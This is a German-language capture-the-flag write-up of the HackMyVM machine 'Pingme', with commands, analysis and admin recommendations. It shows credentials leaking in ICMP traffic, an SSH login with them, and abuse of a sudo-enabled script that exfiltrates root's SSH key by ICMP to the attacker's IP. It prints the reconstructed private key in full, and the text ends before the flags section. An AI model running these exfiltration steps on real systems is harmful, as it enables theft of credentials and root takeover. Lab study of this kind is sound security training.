@@ -1,0 +1,449 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pingme - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body class="level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+ 
+    <div class="header-bg level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+        <h1>Pingme - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2> <!-- H2 ohne Inline-Style, Farbe via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe via CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">tcpdump</div>
+                <div class="tool-item">tshark</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">cut</div>
+                <div class="tool-item">tr</div>
+                <div class="tool-item">sed</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#poc">Proof of Concept (ICMP Data Exfiltration)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/tajer]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.124</span>	<span class="command">08:00:27:6a:9b:ec</span>	PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird ausgeführt, um aktive Hosts im lokalen Netzwerksegment zu entdecken. Er identifiziert einen Host mit der IP-Adresse <span class="command">192.168.2.124</span> und der MAC-Adresse <span class="command">08:00:27:6a:9b:ec</span>, die dem Hersteller PCS Systemtechnik GmbH (oft ein Indikator für Oracle VirtualBox) zugeordnet ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem "Pingme" wurde erfolgreich im Netzwerk lokalisiert. Diese IP-Adresse ist der Ausgangspunkt für alle weiteren Scans und Interaktionen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die Ziel-IP <span class="command">192.168.2.124</span>. Führen Sie als Nächstes Port-Scans (z.B. mit `nmap`) durch, um offene Dienste zu identifizieren und festzustellen, welche Angriffsvektoren verfügbar sind.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Effektivität von ARP-Scans reduzieren. Überwachen Sie das Netzwerk auf ungewöhnliche ARP-Aktivitäten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/tajer]
+└─# <span class="command">curl 192.168.2.124</span></div>
+                    <pre>
+Simple 1 page layout and transmitting ICMP packets..
+
+Checking your connection</p>
+
+pinging 192.168.2.140 from 192.168.2.124<pre>PING 192.168.2.140 (192.168.2.140) 56(84) bytes of data.
+64 bytes from 192.168.2.140: icmp_seq=1 ttl=64 time=0.150 ms
+64 bytes from 192.168.2.140: icmp_seq=2 ttl=64 time=0.142 ms
+64 bytes from 192.168.2.140: icmp_seq=3 ttl=64 time=0.145 ms
+64 bytes from 192.168.2.140: icmp_seq=4 ttl=64 time=0.181 ms
+
+--- 192.168.2.140 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `curl 192.168.2.124` ruft den Inhalt der Webseite ab, die auf Port 80 des Zielsystems gehostet wird. Die Webseite enthält Text, der auf ICMP-Pakete hinweist ("transmitting ICMP packets"). Außerdem zeigt die Ausgabe einen `ping`-Befehl, der vom Zielsystem (<span class="command">192.168.2.124</span>) zur IP-Adresse <span class="command">192.168.2.140</span> (vermutlich die IP des Angreifers/Pentesters) ausgeführt wird, sowie die Ergebnisse dieses Pings.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein höchst ungewöhnliches Verhalten für eine Webseite. Es deutet stark darauf hin, dass der Webserver beim Aufruf der Seite aktiv ICMP-Pakete sendet oder eine Aktion auslöst, die ICMP-Pakete generiert. Die Tatsache, dass die IP des Angreifers (<span class="command">192.168.2.140</span>) angepingt wird, legt nahe, dass diese Pakete Informationen enthalten könnten (Data Exfiltration).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da die Webseite ICMP-Traffic generiert und an den Client (Angreifer) sendet, muss dieser Traffic mit einem Netzwerk-Sniffer (wie `tcpdump` oder Wireshark) auf dem Angreifer-System aufgezeichnet werden, während die Webseite erneut abgerufen wird. Analysieren Sie die aufgezeichneten ICMP-Pakete auf versteckte Daten.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie sofort die Webserver-Konfiguration und den Code der Webanwendung. Eine Webanwendung sollte normalerweise keine `ping`-Befehle ausführen oder unaufgefordert ICMP-Pakete an Clients senden. Dies könnte ein Hinweis auf eine Command Injection Schwachstelle oder eine absichtlich eingebaute (unsichere) Funktionalität sein.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">tcpdump -i eth0 src 192.168.2.124 -w user.cap</span></div>
+                    <pre>
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+^C<span class="command">9 packets captured</span>
+9 packets received by filter
+0 packets dropped by kernel
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird `tcpdump` gestartet, um Netzwerkverkehr auf dem Interface `eth0` mitzuschneiden. Der Filter `src 192.168.2.124` sorgt dafür, dass nur Pakete aufgezeichnet werden, die vom Zielsystem stammen. Die Option `-w user.cap` speichert die aufgezeichneten Pakete in einer Datei namens `user.cap`. Während `tcpdump` lief, wurde vermutlich die Webseite `http://192.168.2.124` erneut aufgerufen (implizit). Der Prozess wurde mit Strg+C beendet, nachdem 9 Pakete erfasst wurden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist die korrekte Vorgehensweise, um den im vorherigen Schritt vermuteten ICMP-Traffic aufzuzeichnen. Die 9 erfassten Pakete enthalten wahrscheinlich die relevanten ICMP-Nachrichten, die analysiert werden müssen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie die Datei `user.cap` mit einem Tool wie `tshark` (Kommandozeilenversion von Wireshark) oder Wireshark selbst. Untersuchen Sie den Dateninhalt (Payload) der ICMP-Pakete auf ungewöhnliche Muster oder extrahierbare Informationen.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion, da dies auf dem Angreifer-System geschieht. Fokus bleibt auf der Ursachenanalyse des ICMP-Traffics auf dem Server.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">tshark -r user.cap -V | grep ^0020 | awk '{print $18}'</span></div>
+                    <pre>
+Running as user "root" and group "root". This could be dangerous.
+<span class="command">name.username.us</span>
+<span class="command">r.pinger.pinger.</span>
+<span class="command">word.password.pa</span>
+<span class="password">3.P!ngM3.P!ngM3.</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `tshark` wird verwendet, um die zuvor erstellte Capture-Datei `user.cap` zu analysieren. `-r user.cap` gibt die Datei an. `-V` aktiviert die detaillierte Ansicht der Pakete. Die Ausgabe wird durch `grep ^0020` gefiltert, was wahrscheinlich Zeilen auswählt, die den Beginn des ICMP-Daten-Payloads zeigen (Offset 0x0020 im Paket-Hexdump ist oft der Start der ICMP-Daten nach IP- und ICMP-Header). `awk '{print $18}'` extrahiert das 18. Feld aus diesen Zeilen, welches hier anscheinend die ASCII-Repräsentation eines Teils des ICMP-Payloads enthält.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund durch ICMP Data Exfiltration! Die Ausgabe zeigt, dass Teile von Zeichenketten über die ICMP-Pakete übertragen wurden. Wenn man die Fragmente zusammensetzt, ergeben sich klare Hinweise auf Zugangsdaten: Username = `<span class="command">pinger</span>` und Password = `<span class="password">P!ngM3</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die extrahierten Zugangsdaten `<span class="command">pinger</span>`:`<span class="password">P!ngM3</span>`, um sich am Zielsystem anzumelden. Da nur Port 80 offen zu sein schien (basierend auf dem ersten `curl`), muss entweder ein anderer Dienst laufen (Nmap-Scan wiederholen oder gründlicher prüfen) oder es gibt einen versteckten Login auf der Webseite. Am wahrscheinlichsten ist jedoch ein SSH-Dienst auf einem Standard- oder Nicht-Standard-Port.<br><strong>Empfehlung (Admin):</strong> Dringend die Webanwendung untersuchen, die diese ICMP-Pakete generiert und Daten leakt. Entfernen Sie diese Funktionalität oder sichern Sie sie ab. Ändern Sie sofort die kompromittierten Zugangsdaten.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh pinger@192.168.2.124</span></div>
+                    <pre>
+The authenticity of host '192.168.2.124 (192.168.2.124)' can't be established.
+ED25519 key fingerprint is SHA256:jIHuqj6aE+2blT+6SnkGKkaR7dRiUscb9FAVVG/h9DU.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added '192.168.2.124' (ED25519) to the list of known hosts.
+pinger@192.168.2.124's password: <span class="password">[Passworteingabe: P!ngM3]</span>
+Linux pingme 5.10.0-11-amd64 #1 SMP Debian 5.10.92-1 (2022-01-18) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Mar  5 19:21:06 2022 from 10.0.0.10
+pinger@pingme:~$ <span class="password"># Login erfolgreich</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich per SSH als Benutzer `<span class="command">pinger</span>` am Zielsystem <span class="command">192.168.2.124</span> anzumelden. Nachdem die Host-Authentizität bestätigt wurde, wird das zuvor aus dem ICMP-Traffic extrahierte Passwort `<span class="password">P!ngM3</span>` eingegeben. Der Login ist erfolgreich, und der Angreifer erhält eine Shell als Benutzer `pinger`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Initial Access erfolgreich! Der unkonventionelle Weg über die Analyse des ICMP-Traffics zur Extraktion von Zugangsdaten hat funktioniert. SSH läuft also doch auf dem Zielsystem (vermutlich auf dem Standardport 22, auch wenn Nmap ihn initial nicht zeigte oder der Scan unvollständig war).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell (z.B. `export TERM=xterm`). Führen Sie grundlegende Enumerationsbefehle aus: `id`, `whoami`, `pwd`, `ls -la /home`, `sudo -l`, um die Rechte und die Umgebung des Benutzers `pinger` zu verstehen und nach Wegen zur Privilege Escalation zu suchen.<br><strong>Empfehlung (Admin):</strong> Ändern Sie das Passwort für `pinger`. Überprüfen Sie die SSH-Konfiguration (`/etc/ssh/sshd_config`), um sicherzustellen, dass nur notwendige Authentifizierungsmethoden erlaubt sind. Analysieren Sie die Ursache für das Datenleck über ICMP.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">pinger@pingme:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for pinger on pingme:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User pinger may run the following commands on pingme:
+    <span class="command">(root) NOPASSWD: /usr/local/sbin/sendfilebyping</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `pinger` wird `sudo -l` ausgeführt, um die `sudo`-Berechtigungen zu überprüfen. Die Ausgabe zeigt, dass `pinger` den Befehl `/usr/local/sbin/sendfilebyping` als `root` ohne Passwortabfrage (`NOPASSWD`) ausführen darf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein klarer und vielversprechender Vektor für Privilege Escalation. Ein benutzerdefiniertes Skript, das mit Root-Rechten ausgeführt werden kann, ist oft anfällig für Manipulation oder Missbrauch.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie das Skript `/usr/local/sbin/sendfilebyping`. Führen Sie es ohne Argumente aus, um Hilfe oder Fehlermeldungen zu sehen. Untersuchen Sie den Quellcode, falls möglich. Suchen Sie nach Möglichkeiten, den Dateipfadparameter (`<path to file>`) zu missbrauchen, um beliebige Dateien zu lesen (z.B. `/root/.ssh/id_rsa`, `/etc/shadow`).<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Notwendigkeit und Sicherheit des Skripts `/usr/local/sbin/sendfilebyping`. Wenn ein Benutzer ein Skript als Root ausführen muss, stellen Sie sicher, dass das Skript sicher implementiert ist, keine beliebigen Dateipfade akzeptiert oder validiert und bereinigt diese rigoros. Gewähren Sie `sudo`-Rechte nach dem Least-Privilege-Prinzip.</p>
+
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept: ICMP Data Exfiltration via Sudo-privilegiertem Skript</h2>
+
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Der Benutzer `pinger` hat `sudo`-Rechte, um das Skript `/usr/local/sbin/sendfilebyping` als `root` ohne Passwort auszuführen. Dieses Skript ist dafür vorgesehen, den Inhalt einer angegebenen Datei Zeichen für Zeichen über ICMP-Pakete an eine Ziel-IP-Adresse zu senden. Da das Skript als `root` läuft, kann es jede Datei auf dem System lesen, einschließlich hochsensibler Dateien wie privater SSH-Schlüssel. Durch Angabe der Angreifer-IP als Ziel und des Pfads zur Zieldatei (z.B. `/root/.ssh/id_rsa`) kann der Angreifer den Inhalt dieser Datei über das Netzwerk exfiltrieren, selbst wenn andere Kanäle (wie direkte SSH-Verbindungen als Root oder Dateitransfers) blockiert sind.</p>
+
+            <p class="evaluation"><strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Shell-Zugriff als Benutzer `pinger` auf dem Zielsystem.</li>
+                    <li>Die `sudo`-Regel, die `pinger` erlaubt, `/usr/local/sbin/sendfilebyping` als `root` ohne Passwort auszuführen.</li>
+                    <li>Ein Netzwerk-Sniffer (`tcpdump`, `tshark`, Wireshark) auf dem Angreifer-System, um die eingehenden ICMP-Pakete zu erfassen.</li>
+                    <li>Ein Skript oder eine Befehlskette auf dem Angreifer-System, um die Daten aus den ICMP-Paketen zu extrahieren und die ursprüngliche Datei zu rekonstruieren.</li>
+                </ul>
+            </p>
+
+            <p class="recommendation"><strong>Schritt-für-Schritt Anleitung:</strong>
+                <ol>
+                    <li>
+                        <strong>Netzwerk-Sniffer starten (Angreifer-System):</strong>
+                        Starten Sie `tcpdump` oder `tshark`, um ICMP-Pakete vom Ziel (<span class="command">192.168.2.124</span>) zu erfassen und in eine Datei (z.B. `key.cap`) zu speichern. Beispiel:
+                        <div class="code-block">
+                            <div class="terminal">
+                                <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">tcpdump -i eth0 icmp and src 192.168.2.124 -w key.cap</span></div>
+                                <pre>tcpdump: listening on eth0...</pre>
+                            </div>
+                        </div>
+                    </li>
+                    <li>
+                        <strong>Exfiltrationsskript ausführen (Zielsystem):</strong>
+                        Führen Sie in der `pinger`-Shell das `sudo`-privilegierte Skript aus, um z.B. den privaten SSH-Schlüssel von Root an die Angreifer-IP (<span class="command">192.168.2.140</span>) zu senden:
+                        <div class="code-block">
+                            <div class="terminal">
+                                <div class="prompt">pinger@pingme:~$ <span class="command">sudo /usr/local/sbin/sendfilebyping 192.168.2.140 /root/.ssh/id_rsa</span></div>
+                                <pre>
+Packet 1
+Packet 2
+[...]
+Packet 2602
+</pre>
+                            </div>
+                        </div>
+                    </li>
+                    <li>
+                        <strong>Netzwerk-Sniffer stoppen (Angreifer-System):</strong>
+                        Beenden Sie `tcpdump`/`tshark` (Strg+C), nachdem das Skript auf dem Zielsystem durchgelaufen ist.
+                    </li>
+                    <li>
+                        <strong>Daten extrahieren und Datei rekonstruieren (Angreifer-System):</strong>
+                        Verwenden Sie ein Tool oder eine Skriptkette (wie die im Bericht gezeigte `tshark | grep | awk | cut | tr | sed`-Kette), um die einzelnen Zeichen aus dem Payload der ICMP-Pakete in `key.cap` zu extrahieren und zur ursprünglichen Datei (`id_rsa`) zusammenzusetzen.
+                        <div class="code-block">
+                            <div class="terminal">
+                                <div class="prompt">┌──(root㉿cyber)-[~/tajer]
+└─# <span class="command">tshark -r key.cap -V | grep 0020 | awk '{print $18}' | cut -c 1 | tr -d '\n' | tr '.' '\n' | sed -r 's/(.*SH|P.*TE|KEY)/& /g' > id_root_rsa</span></div>
+                                <pre>[...]</pre> <!-- Befehl zur Rekonstruktion -->
+                            </div>
+                        </div>
+                    </li>
+                     <li>
+                        <strong>Ergebnis überprüfen:</strong>
+                        Die Datei `id_root_rsa` sollte nun den privaten SSH-Schlüssel des Root-Benutzers enthalten.
+                         <div class="code-block">
+                             <div class="terminal">
+                                <div class="prompt">┌──(root㉿cyber)-[~/tajer]
+└─# <span class="command">cat id_root_rsa</span></div>
+                                 <pre><span class="password">-----BEGIN OPENSSH PRIVATE KEY-----
+[...]
+-----END OPENSSH PRIVATE KEY-----</span></pre>
+                             </div>
+                        </div>
+                    </li>
+                </ol>
+            </p>
+
+            <p class="analysis"><strong>Erwartetes Ergebnis:</strong> Der Inhalt der Zieldatei (z.B. `/root/.ssh/id_rsa`) wird erfolgreich über ICMP-Pakete exfiltriert und auf dem Angreifer-System rekonstruiert.</p>
+
+            <p class="evaluation"><strong>Beweismittel:</strong> Die rekonstruierte Datei (`id_root_rsa`) auf dem Angreifer-System, die den Inhalt der ursprünglichen Datei vom Zielsystem enthält.</p>
+
+            <p class="recommendation"><strong>Risikobewertung:</strong> Hoch. Die unsichere `sudo`-Regel ermöglicht es einem Benutzer mit geringen Rechten, beliebige Dateien als Root zu lesen und diese über einen schwer zu blockierenden Kanal (ICMP) zu exfiltrieren. Dies führt zur Kompromittierung hochsensibler Daten und ermöglicht in diesem Fall den direkten Root-Zugriff über den gestohlenen SSH-Schlüssel.</p>
+
+            <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                <ul>
+                    <li>**Sudo-Regel entfernen/einschränken:** Die `sudo`-Regel für `pinger` und `/usr/local/sbin/sendfilebyping` muss entfernt oder stark eingeschränkt werden.</li>
+                    <li>**Skript absichern/entfernen:** Das Skript `sendfilebyping` ist inhärent unsicher, wenn es mit Root-Rechten ausgeführt wird. Es sollte entfernt oder so umgeschrieben werden, dass es keine beliebigen Dateipfade akzeptiert und nicht als Root läuft.</li>
+                    <li>**ICMP-Filterung:** Obwohl ICMP oft für Netzwerkdiagnosen benötigt wird, können Firewalls so konfiguriert werden, dass sie ungewöhnliche ICMP-Typen oder -Größen blockieren oder zumindest protokollieren, um solche Exfiltrationsversuche zu erkennen.</li>
+                    <li>**Least Privilege:** Gewähren Sie Benutzern und Prozessen nur die minimal notwendigen Berechtigungen.</li>
+                    <li>**Regelmäßige Audits:** Überprüfen Sie regelmäßig `sudo`-Regeln und Dateiberechtigungen auf Schwachstellen.</li>
+                </ul>
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">pinger@pingme:~$ <span class="command">sudo /usr/local/sbin/sendfilebyping</span></div>
+                    <pre>
+sendfilebyping <ip address> <path to file>
+Only sends 1 char at a time - no error checking and slow
+(Just a proof of concept for HackMyVm - rpj7)
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Skript `/usr/local/sbin/sendfilebyping` wird ohne Argumente ausgeführt (unter Nutzung der `sudo`-Berechtigung). Es gibt seine Nutzungshinweise aus: Es erwartet eine IP-Adresse und einen Dateipfad und sendet die Datei Zeichen für Zeichen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Funktion des Skripts und dass es einen Dateipfad als Argument entgegennimmt. Dies ist der Ansatzpunkt für den Exploit.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bereiten Sie den Netzwerk-Sniffer auf Ihrem System vor und führen Sie das Skript dann mit Ihrer IP und dem Pfad zur Zieldatei (`/root/.ssh/id_rsa`) aus.<br><strong>Empfehlung (Admin):</strong> Siehe Empfehlungen im POC-Abschnitt bezüglich der Absicherung des Skripts und der `sudo`-Regel.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">pinger@pingme:~$ <span class="command">sudo /usr/local/sbin/sendfilebyping 192.168.2.140 /root/.ssh/id_rsa</span></div>
+                    <pre>
+Packet 1
+Packet 2
+Packet 3
+Packet 4
+...
+Packet 2600
+Packet 2601
+Packet 2602
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der `pinger`-Benutzer führt das Skript `/usr/local/sbin/sendfilebyping` mit `sudo` aus, um die Datei `/root/.ssh/id_rsa` (die Root gehört und normalerweise nicht lesbar ist) an die IP-Adresse des Angreifers (<span class="command">192.168.2.140</span>) zu senden. Das Skript gibt für jedes gesendete Zeichen (vermutlich in einem ICMP-Paket) eine "Packet"-Meldung aus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Exfiltration der Root-SSH-Schlüsseldatei wird erfolgreich durchgeführt. Die `sudo`-Regel wird missbraucht, um auf die Datei zuzugreifen, und das Skript sendet den Inhalt über ICMP.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass der Netzwerk-Sniffer auf <span class="command">192.168.2.140</span> läuft, um diese Pakete zu erfassen. Stoppen Sie den Sniffer, nachdem das Skript beendet ist, und beginnen Sie mit der Rekonstruktion der Schlüsseldatei.<br><strong>Empfehlung (Admin):</strong> Dringend die `sudo`-Regel und das Skript überprüfen/entfernen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/tajer]
+└─# <span class="command">tshark -r key.cap -V | grep 0020 | awk '{print $18}' | cut -c 1 | tr -d '\n' | tr '.' '\n' | sed -r 's/(.*SH|P.*TE|KEY)/ &/g'</span></div>
+                    <pre>
+Running as user "root" and group "root". This could be dangerous.
+<span class="password">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+<span class="password">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span>
+<span class="password">NhAAAAAwEAAQAAAYEA3rzoh1Dhl3lyWI7prcyW5i+WCqgM2vMJbxWayNlg73bXzHo0C2G</span>
+<span class="password">faJKSRu7XB+ttlIjbb/bQ1ohBBH7arDDVeQCiqtBHVBQwGimsEAB6sn0Jj80nUP3Bhd6b</span>
+<span class="password">jLXA6eK24yekajX3d5SUDRaW4ZHmz2Uxe9A49EqPbd0YkdCjLWsrPdkYH+hiyt/GgwTavW</span>
+<span class="password">6x7HWQtZG4hZwT1rfS7fBctQq+ctHnggRLBH2LNFFNqct4ZtfyZ0rn+mLjK5I+6JXVI</span>
+<span class="password">TyAsPrYun6eNhD8e15VzvdR7mAS5sj5gL0i3pkJ7npVMvddhmsmLIrPo16y+Fbxb6LK</span>
+<span class="password">ZZcUMCnggvizrzSzraLZNqcSRIcNCrVqCFU3Fi+U+ULmE5z8vYrHGV5WVc5Zf4Jj/W</span>
+<span class="password">/8qbYwBLajFLYLG9EymdKdE/DiZm9WVzdx/TJX8u0ajo6W6JfSA+gN0HvM4IiFwN8xquiu</span>
+<span class="password">U636I1DPVH9lLydppaSqNTjh1+fphxlC7IQbvovRAAAFiDlV6Fo5VehaAAAAB3NzaC1yc2</span>
+<span class="password">EAAAGBAN686IdQ4ZTt5cli6a3MluYvlgqoDNrzCW8VmsjZY9218x6NAthn2iSkkbu1wf</span>
+<span class="password">rbZSI22/20NaIQQR+2qww1XkAoqrQR1QUMBoprBDgAerJ9CY/NJ1D9wYXem4y1wnituMn</span>
+<span class="password">pGo193eUlA0WluGR5s9lMXvQPRKj23dGJHQoy1rKz3ZGB/oYsrfxoME2r1usex1kDrWRu</span>
+<span class="password">IWcE9a30u3wXLUKvnLTh54IESwR9izRRTanLeGbX8mdK5/pi4yuTiPuiV1SE8gLD62Lpzu</span>
+<span class="password">njYQzvHteVc73Ue5gEubI+YC9Dot6ZCe56VTL3XYZrJiyKz6NesvhW8W+iymWXFDAp4IL4</span>
+<span class="password">s680s62i2TanEkSHDQq1agjhVNxYjvlPlC5hDuTs/L2KxxleVlXWX+CY/1v/Km2MAS2ox</span>
+<span class="password">S2CxvRMpnSnRPw4mZvVlc3cf0yV/LtGo6luiX0gPoDdB7zCIhcDfMarorlt+iNQz1R/</span>
+<span class="password">ZS8naaWkqjU44dfn6YcZQuyEG76L0QAAAAMBAAEAAAGAS/Fq8uAf2dB3HX+xyPkDYXmlxJ</span>
+<span class="password">fcAUxK0b7yVBtAfHeaU3iDEDJb0KLQ3wCGLnwV46P59aXYtJzGVksMdGAp34Q+F6FQ2S</span>
+<span class="password">StgjpUudo7jx1qyMua2bcxJgRMyflt8m7jJQ+6mk04/EHuZJ0WUWpjXhdk6bbKeTWakd</span>
+<span class="password">vHG/gTfeCXtgn1hzfqpnm7pm/lmkrnzFmyCxIlUB6p7IezoN0eh04N/AiKBFgpopLkS37</span>
+<span class="password">Zd4rEh2k15URnSxkjJVymWxIMGIlYvbI5eKRl0PAep8MB3iBGnwjzxCZNirmSuWgVPKZD</span>
+<span class="password">J7QnJeGQpLlv4wZo5yPLsprII5GeM5E9x/bhd2Gb8+p+g8vNuGK+MGpt8ZolkE2m5YUC</span>
+<span class="password">dinCzYjwcRcGvPyu7DyvW7yUym8DVtNfbtv+I0PArDRIGtCirHRCAkuPaiEpBh1zFeomF</span>
+<span class="password">nXJ2Qg1J5RA3+Fb5R84IKn+fIHFFMZzsRWkJzfScQveXAP95UFoKngym67d1Iq4abVAAAA</span>
+<span class="password">wQDYGz/dw5LyQRpZsKLqDs8aM/vSIif8TrqShrEoa4TQ71iZWCiZKuNIcTDLzZ31akYg41</span>
+<span class="password">iss0rMR6SvsHQ5Ehk68PVfki2/jdSy0xUT6qMkt8//7nICL+KEbV+6xqLvegWr3+vvR37R</span>
+<span class="password">SE+4wYup6zry6+5drlR5tzA1Zat3B46ubR5WeuwW/od2Iqr+q6BX+JVpPGzUvSobL6l</span>
+<span class="password">tUgcullxY5rnXBZNKICC4STwvxYHeo8U/Q5AZgDC2jX5WtxQAAADBAPGHR+dTD2d5Lyx</span>
+<span class="password">lWrC1ZovSx9ucMAEe+kaZ6mw2HWEfgev3YhQ93iFqkQt+7CFmzQvTIAF4lW4Yh9gwnTiE</span>
+<span class="password">/5SYzwJdsomiXDJVdU2R9dtrRiJr4YNbFl5eRGgYS9S6ZUmQTNM2MK3Pa5EvF5EmL3XFBK</span>
+<span class="password">PmEMgUYaydrdUuCHUtxHi6M2kuyr/Ukn040UI10a0wl3Epc8dzwcYnwQsRTbAjd8rg3gXl</span>
+<span class="password">k71DwMnR+CtnvznjQNMuz5p346T8fBYwAAAMEA7BVq7SnXDwGxSr4gPqy8JWHFwwk6U52</span>
+<span class="password">vA+X1xDUrbmkaXtQUxqII6D5Padd2t6UD9sFK6hiRcFD3yfbIDD7mheAqHC15DGDfbYb</span>
+<span class="password">JxZasrFjq5+9xSmher2jcLovtYquIW+8USHots+MfW92k7keyfThbaFAS4WBAUGpZTLuB</span>
+<span class="password">U7fXGlP86uVFR+HCPqth1IWBfAbCTxD4U4cLWJW9/B95rXrII/f7cNPP+S+UmwhKkG10j</span>
+<span class="password">a9YX+aoNP2VT47AAAAC3Jvb3RAcGluZ21lAQIDBAUGBw</span>
+<span class="password">-----END OPENSSH PRIVATE KEY-----</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl wird auf dem Angreifer-System ausgeführt, um die Daten aus der Capture-Datei `key.cap` zu verarbeiten. Die Kette aus `tshark`, `grep`, `awk`, `cut`, `tr` und `sed` extrahiert die Zeichen aus den ICMP-Payloads und setzt sie zur ursprünglichen Datei zusammen, wobei auch die Kopf- und Fußzeilen (`-----BEGIN...`, `-----END...`) wiederhergestellt werden. Die Ausgabe ist der vollständige private SSH-Schlüssel des Root-Benutzers vom Zielsystem.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Exfiltration und Rekonstruktion des Schlüssels war erfolgreich. Dies ist der entscheidende Schritt zur Erlangung von Root-Rechten.</p>
